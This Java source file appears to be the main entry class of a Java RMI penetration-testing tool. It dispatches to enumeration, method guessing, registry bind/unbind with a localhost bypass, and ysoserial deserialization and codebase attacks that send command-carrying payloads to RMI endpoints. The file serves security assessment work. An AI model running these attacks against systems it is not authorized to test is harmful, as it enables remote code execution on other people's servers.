package de.qtc.rmg;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Properties;

import org.apache.commons.cli.CommandLine;

import de.qtc.rmg.exceptions.UnexpectedCharacterException;
import de.qtc.rmg.internal.ArgumentParser;
import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.io.Formatter;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.SampleWriter;
import de.qtc.rmg.io.WordlistHandler;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.operations.ActivationClient;
import de.qtc.rmg.operations.DGCClient;
import de.qtc.rmg.operations.MethodAttacker;
import de.qtc.rmg.operations.MethodGuesser;
import de.qtc.rmg.operations.RegistryClient;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.YsoIntegration;
import javassist.CannotCompileException;
import javassist.NotFoundException;

public class Starter {

    private static String defaultConfiguration = "/config.properties";

    @SuppressWarnings({ "rawtypes", "unchecked" })
    public static void main(String[] argv) {

        ArgumentParser parser = new ArgumentParser();
        CommandLine commandLine = parser.parse(argv);

        parser.checkArgumentCount(2);
        String action = "enum";
        String host = parser.getPositionalString(0);
        int port = parser.getPositionalInt(1);

        if( parser.getArgumentCount() >= 3 ) {
            action = parser.getPositionalString(2);
            parser.prepareAction(action);
        }

        Properties config = new Properties();
        RMGUtils.loadConfig(defaultConfiguration, config, false);
        RMGUtils.loadConfig(commandLine.getOptionValue("config", null), config, true);

        int legacyMode = parser.getLegacyMode();
        int argumentPos = Integer.valueOf(commandLine.getOptionValue("argument-position", "-1"));
        int threadCount = Integer.valueOf(commandLine.getOptionValue("threads", config.getProperty("threads")));
        String sampleFolder = commandLine.getOptionValue("sample-folder", config.getProperty("sample-folder"));
        String wordlistFile = commandLine.getOptionValue("wordlist-file", config.getProperty("wordlist-file"));
        String templateFolder = commandLine.getOptionValue("template-folder", config.getProperty("template-folder"));
        String wordlistFolder = commandLine.getOptionValue("wordlist-folder", config.getProperty("wordlist-folder"));
        String ysoserialPath = commandLine.getOptionValue("yso", config.getProperty("ysoserial-path"));
        String functionSignature = commandLine.getOptionValue("signature", "");
        String boundName = commandLine.getOptionValue("bound-name", null);
        String regMethod = parser.validateRegMethod(commandLine.getOptionValue("reg-method", "lookup"));
        String dgcMethod = parser.validateDgcMethod(commandLine.getOptionValue("dgc-method", "clean"));

        Logger.verbose = !commandLine.hasOption("json");
        boolean sslValue = commandLine.hasOption("ssl");
        boolean followRedirect = commandLine.hasOption("follow");
        boolean updateWordlists = commandLine.hasOption("update");
        boolean createSamples = commandLine.hasOption("create-samples");
        boolean zeroArg = commandLine.hasOption("zero-arg");
        boolean localhostBypass = commandLine.hasOption("localhost-bypass");

        if( commandLine.hasOption("no-color") ) {
            Logger.disableColor();
        }

        Formatter format = new Formatter();
        RMIWhisperer rmi = new RMIWhisperer(host, port, sslValue, followRedirect);

        RMGUtils.init();
        RMGUtils.disableWarning();
        ExceptionHandler.showStackTrace(commandLine.hasOption("stack-trace"));

        String[] boundNames = null;
        HashMap<String,String> allClasses = null;
        ArrayList<HashMap<String,String>> boundClasses = null;

        if( parser.requiresBoundNames(action, functionSignature) ) {

            if(action.matches("enum"))
                RMGUtils.enableCodebase();

            rmi.locateRegistry();
            boundNames = rmi.getBoundNames(boundName);

            boundClasses = rmi.getClassNames(boundNames);
            allClasses = (HashMap<String, String>) boundClasses.get(0).clone();
            allClasses.putAll(boundClasses.get(1));
        }

        MethodCandidate candidate = null;
        if( parser.isMethodSignature(functionSignature) ) {

            try {
                candidate = new MethodCandidate(functionSignature);

            } catch (CannotCompileException | NotFoundException e) {
                ExceptionHandler.invalidSignature(functionSignature);
            }
        }

        switch( action ) {

            case "bind":
            case "rebind":
                String bName = parser.getPositionalString(3);
                String listener = parser.getPositionalString(4);
                String[] split = listener.split(":");

                if( split.length != 2 || !split[1].matches("\\d+") ) {
                    ExceptionHandler.invalidListenerFormat(false);
                }

                String listenerHost = split[0];
                int listenerPort = Integer.valueOf(split[1]);

                RegistryClient reg = new RegistryClient(rmi);
                if(action.equals("bind"))
                    reg.bindObject(bName, listenerHost, listenerPort, localhostBypass);
                else
                    reg.rebindObject(bName, listenerHost, listenerPort, localhostBypass);
                break;


            case "unbind":
                bName = parser.getPositionalString(3);
                reg = new RegistryClient(rmi);
                reg.unbindObject(bName, localhostBypass);
                break;


            case "guess":
                if( !RMGUtils.containsObjects(allClasses) )
                    break;

                HashSet<MethodCandidate> candidates = new HashSet<MethodCandidate>();
                if( candidate != null ) {
                    candidates.add(candidate);

                } else {

                    try {
                        WordlistHandler wlHandler = new WordlistHandler(wordlistFile, wordlistFolder, updateWordlists);
                        candidates = wlHandler.getWordlistMethods();
                    } catch( IOException e ) {
                        Logger.eprintlnMixedYellow("Caught", "IOException", "while reading wordlist file(s).");
                        ExceptionHandler.stackTrace(e);
                        RMGUtils.exit();
                    }
                }

                MethodGuesser guesser = new MethodGuesser(rmi, boundClasses.get(1), candidates);
                HashMap<String,ArrayList<MethodCandidate>> results = guesser.guessMethods(boundName, threadCount, zeroArg, legacyMode);
                RMGUtils.addKnownMethods(boundClasses.get(0), results);

                format.listGuessedMethods(results);
                if( !createSamples )
                    break;

                Logger.println("");
                Logger.println("Starting creation of sample files:");
                Logger.println("");
                Logger.increaseIndent();

                try {
                    String className;
                    SampleWriter writer;
                    writer = new SampleWriter(templateFolder, sampleFolder, sslValue, followRedirect, legacyMode);

                    for(String name : results.keySet()) {

                        Logger.printlnMixedYellow("Creating samples for bound name", name + ".");
                        Logger.increaseIndent();

                        className = boundClasses.get(1).get(name);
                        writer.createInterface(name, className, (List<MethodCandidate>)results.get(name));
                        writer.createSamples(name, className, (List<MethodCandidate>)results.get(name), rmi);

                        Logger.decreaseIndent();
                    }

                } catch (IOException | CannotCompileException | NotFoundException e) {
                    ExceptionHandler.unexpectedException(e, "sample", "creation", true);

                } catch (UnexpectedCharacterException e) {
                    Logger.eprintlnMixedYellow("Caught", "UnexpectedCharacterException", "during sample creation.");
                    Logger.eprintln("This is caused by special characters within bound- or classes names.");
                    Logger.eprintlnMixedYellow("You can enforce sample cration with the", "--trusted", "switch.");
                    RMGUtils.exit();
                }

                Logger.decreaseIndent();
                break;


            case "method":
            case "dgc":
            case "reg":
            case "listen":
            case "act":

                String gadget = parser.getPositionalString(3);
                String command = parser.getPositionalString(4);

                if( action.equals("listen") ) {
                    YsoIntegration.createJRMPListener(ysoserialPath, host, port, gadget, command);
                }

                Object payload = YsoIntegration.getPayloadObject(ysoserialPath, gadget, command);

                if( action.equals("method") ) {
                    MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
                    attacker.attack(payload, boundName, argumentPos, "ysoserial", legacyMode);
                } else if( action.equals("dgc") ) {
                    DGCClient dgc = new DGCClient(rmi);
                    dgc.gadgetCall(dgcMethod, payload);
                } else if( action.equals("reg") ) {
                    reg = new RegistryClient(rmi);
                    reg.gadgetCall(payload, regMethod, localhostBypass);
                } else if( action.equals("act") ) {
                    ActivationClient act = new ActivationClient(rmi);
                    act.gadgetCall(payload);
                }

                break;


            case "codebase":

                String className = parser.getPositionalString(3);

                payload = null;

                try {
                    payload = RMGUtils.makeSerializableClass(className);
                    payload = ((Class)payload).newInstance();

                } catch (CannotCompileException | InstantiationException | IllegalAccessException e) {
                    ExceptionHandler.unexpectedException(e, "payload", "creation", true);
                }

                if( candidate != null ) {
                    MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
                    attacker.attack(payload, boundName, argumentPos, "codebase", legacyMode);
                } else if( functionSignature.matches("dgc") ) {
                    DGCClient dgc = new DGCClient(rmi);
                    dgc.codebaseCall(dgcMethod, payload);
                } else if( functionSignature.matches("reg") ) {
                    reg = new RegistryClient(rmi);
                    reg.codebaseCall(payload, regMethod, localhostBypass);
                } else if( functionSignature.matches("act") ) {
                    ActivationClient act = new ActivationClient(rmi);
                    act.codebaseCall(payload);
                }

                break;

            case "enum":
                format.listBoundNames(boundNames, boundClasses);

                Logger.println("");
                format.listCodeases();

                Logger.println("");
                RegistryClient registryClient = new RegistryClient(rmi);
                boolean marshal = registryClient.enumerateStringMarshalling();

                Logger.println("");
                registryClient.enumCodebase(marshal, regMethod, localhostBypass);

                Logger.println("");
                registryClient.enumLocalhostBypass();

                Logger.println("");
                DGCClient dgc = new DGCClient(rmi);
                dgc.enumDGC(dgcMethod);

                Logger.println("");
                dgc.enumJEP290(dgcMethod);

                Logger.println("");
                registryClient.enumJEP290Bypass(regMethod, localhostBypass, marshal);

                Logger.println("");
                ActivationClient activationClient = new ActivationClient(rmi);
                activationClient.enumActivator();
                break;

            default:
                Logger.printlnPlainMixedYellow("Unknown action:", action);
                parser.printHelp();
        }
    }
}
